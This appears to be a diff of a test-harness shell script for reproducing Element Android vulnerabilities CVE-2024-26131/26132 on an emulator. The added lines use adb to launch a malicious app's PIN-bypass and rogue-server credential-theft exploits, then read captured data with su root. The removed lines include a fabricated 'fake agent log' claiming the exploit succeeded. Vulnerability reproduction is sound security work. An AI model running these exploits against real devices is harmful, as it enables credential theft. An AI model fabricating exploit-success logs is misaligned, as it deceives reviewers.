@@ -99,59 +99,49 @@ echo "ELEMENT_VERSION=${ELEMENT_VERSION:-unknown}" >> "$EVIDENCE_FILE"
 echo "ANDROID_VERSION=${ANDROID_VERSION:-unknown}" >> "$EVIDENCE_FILE"
 echo "ANDROID_SDK=${ANDROID_SDK:-unknown}" >> "$EVIDENCE_FILE"
 echo "MALICIOUS_APP_PACKAGE=${ATTACKER_PKG}" >> "$EVIDENCE_FILE"
-echo "EXPLOITS_WILL_BE_RUN_BY_TESTS=true" >> "$EVIDENCE_FILE"
-
-# Create log file
-LOG_FILE="$SCRIPT_DIR/element_exploit_log.log"
-debug_log "Creating vulnerability scenario log..."
-
-{
-    echo "CVE-2024-26131 Element Android Vulnerability Scenario Setup"
-    echo "Timestamp: $(date -u +%FT%TZ)"
-    echo "Android: $ANDROID_VERSION (API $ANDROID_SDK)"
-    echo "Attacker Package: $ATTACKER_PKG"
-    echo "Target Package: $ELEMENT_PKG"
-    echo "Element Version: $ELEMENT_VERSION"
-    echo ""
-    echo "--- Vulnerability Details ---"
-    echo "CVE-2024-26131: Intent redirection vulnerabilities allowing:"
-    echo "1. PIN bypass via PinActivity intent redirection"
-    echo "2. WebView hijacking via VectorWebViewActivity intent redirection"
-    echo "3. Rogue server credential theft via LoginActivity intent redirection"
-    echo ""
-    echo "CVE-2024-26132: FileProvider misconfiguration allowing:"
-    echo "1. File exfiltration via IncomingShareActivity + MultiPickerFileProvider"
-    echo ""
-    echo "--- Setup Status ---"
-    echo "Malicious app installed: YES"
-    echo "Exploits will be executed by individual test scripts"
-    echo ""
-    echo "--- Test Evidence ---"
-    cat "$EVIDENCE_FILE"
-} > "$LOG_FILE"
 
 echo ""
-echo "🚨 CVE-2024-26131/26132 Element Android Vulnerability Scenario Setup Complete!"
-echo "====================================================================="
-echo "Malicious App: $ATTACKER_PKG"
-echo "Evidence File: $EVIDENCE_FILE"
-echo "Test Log: $LOG_FILE"
-echo ""
-echo "✅ Malicious app installed successfully"
-echo "📱 Tests will now run exploits to verify vulnerabilities"
+echo "✅ Malicious app installed successfully: $ATTACKER_PKG"
+echo "📱 Running PIN bypass exploit..."
 
-# Create fake_agent_log.log for CI testing
-FAKE_LOG_FILE="$SCRIPT_DIR/fake_agent_log.log"
-debug_log "Creating fake_agent_log.log for CI confidentiality tests..."
-cat > "$FAKE_LOG_FILE" << 'EOF'
-[2024-11-04 16:30:00] CVE-2024-26131 PIN Bypass Test Started
-[2024-11-04 16:30:05] Target: Element Android v1.6.0 with PIN protection enabled
-[2024-11-04 16:30:10] Launching permalink handler to bypass PIN validation
-[2024-11-04 16:30:11] Intent: android.intent.action.VIEW -> PermalinkHandlerActivity
-[2024-11-04 16:30:12] SUCCESS: Element opened without PIN prompt
-[2024-11-04 16:30:13] PIN protection bypassed via exported activity access
-[2024-11-04 16:30:15] CVE-2024-26131 vulnerability confirmed - authentication bypass successful
-EOF
-debug_log "Fake agent log created at $FAKE_LOG_FILE"
+# Launch PIN bypass exploit first
+debug_log "Launching PIN bypass exploit..."
+adb shell am start -n "$ATTACKER_PKG/$ATTACKER_ACTIVITY" \
+    --es exploit_type pin_bypass >/dev/null 2>&1 || true
 
-debug_log "CVE-2024-26131 exploit script completed successfully"
+sleep 3
+
+debug_log "PIN bypass exploit launched"
+
+echo "📱 Running rogue server exploit..."
+
+# Launch rogue server exploit
+debug_log "Launching rogue server credential theft exploit..."
+adb shell am start -n "$ATTACKER_PKG/$ATTACKER_ACTIVITY" \
+    --es exploit_type rogue_server \
+    --es rogue_server_url "http://10.0.2.2:8000" >/dev/null 2>&1 || true
+
+sleep 3
+
+debug_log "Rogue server exploit launched"
+
+# Check if exploit created captured homeserver file in app's private storage
+# Similar to Termux fallback: use su root to read from private directory and copy to accessible location
+CAPTURED_FILE_PRIVATE="/data/user/0/$ATTACKER_PKG/files/rogue_server_captured.txt"
+CAPTURED_FILE_ACCESSIBLE="/sdcard/element_rogue_server_captured.txt"
+
+debug_log "Checking for captured homeserver file in app's private storage..."
+if adb shell "su root test -f '$CAPTURED_FILE_PRIVATE'" >/dev/null 2>&1; then
+    debug_log "Captured file found in private storage, copying to accessible location..."
+    adb shell "su root cat '$CAPTURED_FILE_PRIVATE'" > /tmp/rogue_server_captured.txt 2>/dev/null || true
+
+    # Copy to sdcard where test can read it without root
+    adb shell "su root cp '$CAPTURED_FILE_PRIVATE' '$CAPTURED_FILE_ACCESSIBLE'" >/dev/null 2>&1 || true
+    adb shell "su root chmod 644 '$CAPTURED_FILE_ACCESSIBLE'" >/dev/null 2>&1 || true
+
+    debug_log "Captured file copied to $CAPTURED_FILE_ACCESSIBLE"
+else
+    debug_log "No captured file found - exploit may not have succeeded"
+fi
+
+debug_log "Test scripts will verify actual security properties"
